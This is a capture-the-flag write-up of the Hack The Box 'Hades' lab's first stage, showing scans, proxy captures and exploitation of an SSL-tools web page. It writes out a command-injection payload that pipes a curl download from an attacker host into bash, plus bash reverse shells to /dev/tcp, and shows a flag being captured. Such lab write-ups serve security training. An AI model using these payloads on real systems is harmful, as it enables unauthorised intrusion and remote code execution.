---
description: >-
  Hades is designed to put your skills in Active Directory enumeration &
  exploitation, lateral movement, and privilege escalation to the test within a
  small enterprise network.
---

# Hades



## Chasm

```
msplmee@kali:~$ nmap -p- --min-rate 10000 10.13.38.16 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 23:43 EDT
Nmap scan report for 10.13.38.16
Host is up (0.33s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 57.24 seconds
                                                                                            
msplmee@kali:~$ nmap -p 443 -sC -sV 10.13.38.16 -Pn 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 23:45 EDT
Nmap scan report for 10.13.38.16
Host is up (0.33s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=10.13.38.16/organizationName=Gigantic Hosting Limited/stateOrProvinceName=New York/countryName=US
| Not valid before: 2019-09-04T21:52:00
|_Not valid after:  2039-08-30T21:52:00
|_http-title: Gigantic Hosting | Home

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.56 seconds
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

```
msplmee@kali:~/HTB/Endgames$ mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=3
[23:51:49.794] reverse proxy to https://10.13.38.16 listening at *:443.
[23:52:05.795][10.13.38.16:49711] client connect
[23:52:06.130][10.13.38.16:49711] server connect 10.13.38.16:443
10.13.38.16:49711: GET https://10.13.38.16/
    Host: 10.13.38.16
    User-Agent: curl/7.58.0
    Accept: */*

 << 200 OK 14.3k
    Date: Thu, 28 Sep 2023 03:52:01 GMT
    Server: Apache/2.4.29 (Ubuntu)
    X-Frame-Options: DENY
    X-Content-Type-Options: nosniff
    Last-Modified: Thu, 05 Sep 2019 15:58:47 GMT
    ETag: "3960-591d0659f7d83"
    Accept-Ranges: bytes
    Content-Length: 14688
    Vary: Accept-Encoding
    Content-Type: text/html

    <!--
    Author: W3layouts
    Author URL: http://w3layouts.com
    License: Creative Commons Attribution 3.0 Unported
    License URL: http://creativecommons.org/licenses/by/3.0/
    -->
    <!DOCTYPE HTML>
    <html>
    <head>
      <title>Gigantic Hosting | Home</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <meta name="keywords" content="Digital_Host Responsive web template, Bootstrap Web Templates, Flat Web Templates, Andriod Compatible web template,                                                                  
      Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyErricsson, Motorola web design" />                                                                                                  
      <script type="application/x-javascript">addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); }</script>                                         
      <link href="css/bootstrap.css" rel='stylesheet' type='text/css' />
      <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
      <script src="js/jquery.min.js"></script>
      <!-- Custom Theme files -->
      <link href="css/style.css" rel='stylesheet' type='text/css' />
      <!-- Custom Theme files -->
      <!-- webfonts -->
      <link href='http://fonts.googleapis.com/css?family=Slabo+27px' rel='stylesheet' type='text/css'>
      <!-- webfonts -->
      <!----font-Awesome----->
      <link rel="stylesheet" href="fonts/css/font-awesome.min.css">
      <!----font-Awesome----->
    </head>
    <body>
      <!-- header -->
      <div class="header">
        <!-- container -->
        <!-- top-nav -->
        <div class="container">
          <div class="logo">
            <a href="index.html">
              <img src="images/logo.png" alt=""/>
            </a>
          </div>
          <div class="header_bottom_right">
            <div class="h_menu4">
              <!-- start h_menu4 -->
              <a class="toggleMenu" href="#">Menu</a>
              <ul class="nav">
                <li class="active">
                  <a href="index.html">Home</a>
                </li>
                <li>
                  <a href="services.html">Services</a>
                  <ul>
                    <li>
                      <a href="services.html">Dedicated Servers</a>
                    </li>
                    <li>
                      <a href="services.html">VPS Servers</a>
                    </li>
                    <li>
                      <a href="services.html">Shared Hosting</a>
                    </li>
                    <li>
                      <a href="services.html">SSL Certificates</a>
                    </li>
                  </ul>
                </li>
                <li>
                  <a href="clients.html">Our Clients</a>
                </li>
                <li>
                  <a href="ssltools/certificate.php">SSL Tools</a>
                </li>
    (cut off)

[23:52:08.543][10.13.38.16:49711] client disconnect
[23:52:08.544][10.13.38.16:49711] server disconnect 10.13.38.16:443
```

```
msplmee@kali:~$ curl -kv https://10.10.14.2                                                 
*   Trying 10.10.14.2:443...
* Connected to 10.10.14.2 (10.10.14.2) port 443 (#0)
* ALPN: offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
...
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
[23:57:19.739][10.13.38.16:49725] client connect
[23:57:20.070][10.13.38.16:49725] server connect 10.13.38.16:443
10.13.38.16:49725: GET https://10.13.38.16/www-data
    Host: 10.13.38.16
    User-Agent: curl/7.58.0
    Accept: */*

 << 404 Not Found 274b
    Date: Thu, 28 Sep 2023 03:57:15 GMT
    Server: Apache/2.4.29 (Ubuntu)
    X-Frame-Options: DENY
    X-Content-Type-Options: nosniff
    Content-Length: 274
    Content-Type: text/html; charset=iso-8859-1

    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
    <head>
      <title>404 Not Found</title>
    </head>
    <body>
      <h1>Not Found</h1>
      <p>The requested URL was not found on this server.</p>
      <hr>
      <address>Apache/2.4.29 (Ubuntu) Server at 10.13.38.16 Port 443</address>
    </body>
    </html>

[23:57:21.770][10.13.38.16:49725] client disconnect
[23:57:21.775][10.13.38.16:49725] server disconnect 10.13.38.16:443
```

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.2/443 0>&1" &
```

```
10.10.14.2/$(curl${IFS}10.10.14.2|bash)
```

```
msplmee@kali:~$ pwncat-cs -l -p 443      
[00:09:39] Welcome to pwncat 🐈!                                                              __main__.py:164
[00:10:29] received connection from 10.13.38.16:49782                                              bind.py:84
[00:10:33] 10.13.38.16:49782: registered new host w/ db                                        manager.py:957
(local) pwncat$                                                                                              
(remote) www-data@cee1146c7ac1:/var/www/html/ssltools$ bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

```
msplmee@kali:~$ pwncat-cs -l -p 4444
[00:15:38] Welcome to pwncat 🐈!                                                              __main__.py:164
[00:16:12] received connection from 10.13.38.16:49813                                              bind.py:84
[00:16:16] 10.13.38.16:49813: registered new host w/ db                                        manager.py:957
(local) pwncat$                                                                                              
(remote) www-data@cee1146c7ac1:/var/www/html/ssltools$ ls 
0fe092ba0_flag.txt  certificate.php  logo.png
(remote) www-data@cee1146c7ac1:/var/www/html/ssltools$ cat 0fe092ba0_flag.txt 
HADES{Fr4gil3_b1aCkli5tiNg}
```

## Guardian

```
www-data@cee1146c7ac1:/$ ls -la
ls -la
total 100
drwxr-xr-x   1 root root 4096 Sep  4  2019 .
drwxr-xr-x   1 root root 4096 Sep  4  2019 ..
-rwxr-xr-x   1 root root    0 Sep  4  2019 .dockerenv
drwxr-xr-x   1 root root 4096 Sep  5  2019 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Sep 28 04:38 dev
drwxr-xr-x   1 root root 4096 Sep  5  2019 etc
drwxr-xr-x   2 root root 4096 Apr 24  2018 home
drwxr-xr-x   1 root root 4096 Sep  5  2019 lib
drwxr-xr-x   2 root root 4096 Aug  7  2019 lib64
drwxr-xr-x   2 root root 4096 Aug  7  2019 media
drwxr-xr-x   2 root root 4096 Aug  7  2019 mnt
drwxr-xr-x   2 root root 4096 Aug  7  2019 opt
dr-xr-xr-x 161 root root    0 Sep 28 04:38 proc
drwx------   1 root root 4096 Sep 22  2019 root
drwxr-xr-x   1 root root 4096 Sep  5  2019 run
drwxr-xr-x   1 root root 4096 Sep  5  2019 sbin
drwxr-xr-x   2 root root 4096 Aug  7  2019 srv
dr-xr-xr-x  13 root root    0 Sep 28 04:38 sys
drwxrwxrwt   1 root root 4096 Sep 28 05:17 tmp
drwxr-xr-x   1 root root 4096 Aug  7  2019 usr
drwxr-xr-x   1 root root 4096 Sep  4  2019 var
```

